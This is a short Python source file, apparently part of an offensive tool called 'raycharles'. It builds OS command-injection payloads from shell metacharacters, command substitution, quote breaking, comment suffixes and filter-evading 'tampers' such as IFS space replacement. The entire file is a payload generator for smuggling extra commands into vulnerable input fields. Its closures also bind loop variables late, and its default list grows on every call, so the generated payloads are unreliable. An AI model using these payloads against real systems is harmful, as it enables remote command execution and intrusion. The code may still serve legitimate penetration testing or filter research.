from typing import Generator, Callable

from raycharles.tampers import *

PayloadGenerator = Callable[[str], str]


COMMENT_CHARS = ("#",)
META_CHARS = ("&&", "||", "&", "|", ";")
QUOTE_CHARS = ("'", '"')
SUBSTITUTION_PATTERNS = ("$(%(cmd)s)", "`%(cmd)s`")
ENDINGS = (">/dev/null", "2>/dev/null")


def build_payloads(
    tampers=[
        add_dollar_and_ats,
        replace_spaces_with_ifs,
    ]
) -> Generator[PayloadGenerator, None, None]:
    tampers.append(lambda x: x)

    for tamper in tampers:
        yield lambda cmd: tamper(cmd)

        for sp in SUBSTITUTION_PATTERNS:
            yield lambda cmd: tamper(sp % {"cmd": cmd})

        for mc in META_CHARS:
            yield lambda cmd: tamper(mc + cmd)

            for cc in COMMENT_CHARS:
                yield lambda cmd: tamper(mc + cmd + cc)

            for end in ENDINGS:
                yield lambda cmd: tamper(end + mc + cmd)

                for cc in COMMENT_CHARS:
                    yield lambda cmd: tamper(end + mc + cmd + cc)

        for qc in QUOTE_CHARS:
            for mc in META_CHARS:
                yield lambda cmd: tamper(qc + mc + cmd)

                for cc in COMMENT_CHARS:
                    yield lambda cmd: tamper(qc + mc + cmd + cc)

                for end in ENDINGS:
                    yield lambda cmd: tamper(qc + end + mc + cmd)

                    for cc in COMMENT_CHARS:
                        yield lambda cmd: tamper(qc + end + mc + cmd + cc)
